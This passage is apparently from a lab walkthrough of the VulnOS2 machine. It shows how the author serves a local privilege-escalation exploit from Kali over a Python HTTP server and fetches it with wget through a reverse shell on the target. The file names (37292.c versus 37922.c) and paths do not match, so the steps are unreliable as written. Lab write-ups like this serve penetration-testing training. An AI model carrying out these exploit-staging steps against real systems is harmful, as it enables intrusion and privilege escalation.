Copy the script from the local Kali system to the VulnOS2 system



To do that I used Python to start the SimpleHTTPServer on port 80.

$ python -m SimpleHTTPServer 80




Copy the exploit file to /home on the Kali Linux machine.

$ cp /usr/share/exploitdb/exploits/linux/local/37292.c /home/

Once the SimpleHTTPServer is running, return to the reverse shell and issue the wget command to copy the exploit script to the local VulnOS2 system. Make sure that the wget command is launched from a directory that has read/write permissions with the apache account (i.e. /tmp).

$ cd tmp
$ wget http://192.168.12.15/home/37922.c
